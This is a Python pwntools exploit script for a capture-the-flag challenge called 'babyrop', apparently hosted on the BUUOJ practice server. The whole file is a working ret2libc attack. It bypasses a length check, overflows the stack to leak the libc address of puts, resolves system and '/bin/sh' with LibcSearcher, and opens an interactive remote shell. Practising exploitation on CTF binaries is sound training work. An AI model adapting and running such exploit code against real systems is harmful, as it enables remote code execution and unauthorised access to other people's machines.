#!/usr/bin/python3.6
from pwn import *

elf = ELF('./babyrop')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

log.info(f'puts: got={hex(puts_got)}; plt={hex(puts_plt)}')

# proc = process('./babyrop')
proc = remote('node3.buuoj.cn', 26351)
main = 0x08048825

payload_length = b'\x00'*7 + b'\xff' + b'\x00' * 24
proc.send(payload_length)
log.info(proc.recvuntil('\n'))

payload_leak = b'i' * (0xe7 + 4) + p32(puts_plt) + p32(main) + p32(puts_got)
proc.send(payload_leak)

puts_libc = u32(proc.recvuntil(b'\n', drop=True))
log.info(f'libc: puts={hex(puts_libc)}')

from LibcSearcher import LibcSearcher

searcher = LibcSearcher('puts', puts_libc)

base_libc = puts_libc - searcher.dump('puts')
log.info(f"libc: base={hex(base_libc)}")

system_libc = base_libc + searcher.dump('system')
binsh_libc = base_libc + searcher.dump('str_bin_sh')
log.info(f'libc: system={hex(system_libc)}; /bin/sh={hex(binsh_libc)}')

proc.send(payload_length)
log.info(proc.recvuntil('\n'))

payload_shell = b'i' * (0xe7 + 4) + p32(system_libc) + p32(main) + p32(binsh_libc)
proc.send(payload_shell)

proc.interactive()
